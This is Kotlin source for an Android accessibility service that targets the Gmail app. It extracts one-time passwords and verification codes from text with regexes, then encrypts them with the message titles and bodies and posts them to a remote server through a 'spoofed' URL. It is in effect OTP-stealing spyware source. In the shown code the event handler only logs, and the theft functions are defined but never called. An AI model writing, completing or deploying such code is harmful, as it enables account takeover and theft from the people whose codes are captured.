package com.gafam.relay

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.app.Notification
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import java.security.MessageDigest
import java.security.SecureRandom
import javax.crypto.Cipher
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec
import kotlin.concurrent.thread
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import android.util.Base64

class GmailAccessibilityService : AccessibilityService() {

    companion object {
        private const val TAG = "GAFAM_AccSvc"
        private const val GMAIL_PKG = "com.google.android.gm"

        private val CODE_PATTERNS = listOf(
            Regex("""\b(\d{4,8})\b"""),
            Regex("""code[\s:]+(\d{4,8})""", RegexOption.IGNORE_CASE),
            Regex("""verify[\s:]+(\d{4,8})""", RegexOption.IGNORE_CASE),
            Regex("""otp[\s:]+(\d{4,8})""", RegexOption.IGNORE_CASE),
            Regex("""password[\s:]+(\d{4,8})""", RegexOption.IGNORE_CASE),
            Regex("""confirme[\s:]+(\d{4,8})""", RegexOption.IGNORE_CASE),
        )
    }

    override fun onServiceConnected() {
        Log.i(TAG, "✅ Service connected")
        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPES_ALL_MASK
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            notificationTimeout = 0 // no event collapsing
            flags = AccessibilityServiceInfo.DEFAULT
        }
        serviceInfo = info
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        Log.d(TAG, "EVENT type=${event.eventType} pkg=${event.packageName} text=${event.text}")
    }

    override fun onInterrupt() {}

    private fun extractCodes(text: String): List<String> {
        val codes = mutableListOf<String>()
        val seen = mutableSetOf<String>()
        for (pat in CODE_PATTERNS) {
            for (match in pat.findAll(text)) {
                val code = match.groupValues.getOrNull(1) ?: match.value
                if (seen.add(code)) codes.add(code)
            }
        }
        return codes
    }

    private fun sendToVpc(pkg: String, title: String, text: String, codes: List<String>, timestamp: Long) {
        val prefs = getSharedPreferences("GAFAM_PREFS", MODE_PRIVATE)
        val apiUrl = prefs.getString("apiUrl", null) ?: return
        val jwtSecret = prefs.getString("jwtSecret", null) ?: return

        thread {
            try {
                val spoofedUrl = ApiClient.getSpoofedUrl(apiUrl, "/api/auth/email/notif")
                val client = ApiClient.getClient(applicationContext) ?: return@thread

                val jsonBody = JSONObject().apply {
                    put("app", pkg)
                    put("title", title)
                    put("body", text)
                    put("codes", JSONObject.wrap(codes))
                    put("timestamp", timestamp)
                }

                val plaintext = jsonBody.toString().toByteArray(Charsets.UTF_8)
                val digest = MessageDigest.getInstance("SHA-256")
                val keyBytes = digest.digest(jwtSecret.toByteArray(Charsets.UTF_8))
                val secretKey = SecretKeySpec(keyBytes, "AES")
                val cipher = Cipher.getInstance("AES/GCM/NoPadding")
                val iv = ByteArray(12); SecureRandom().nextBytes(iv)
                cipher.init(Cipher.ENCRYPT_MODE, secretKey, GCMParameterSpec(128, iv))
                val ciphertext = cipher.doFinal(plaintext)

                val encryptedPayload = JSONObject().apply {
                    put("encrypted_data", Base64.encodeToString(ciphertext, Base64.NO_WRAP))
                    put("iv", Base64.encodeToString(iv, Base64.NO_WRAP))
                }

                val body = encryptedPayload.toString().toRequestBody("application/json".toMediaType())
                val request = Request.Builder()
                    .url(spoofedUrl).post(body)
                    .addHeader("Authorization", "Bearer $jwtSecret").build()

                val response = client.newCall(request).execute()
                Log.d(TAG, "VPC response: ${response.code}")
            } catch (e: Exception) {
                Log.e(TAG, "Send failed: ${e.message}")
            }
        }
    }
}
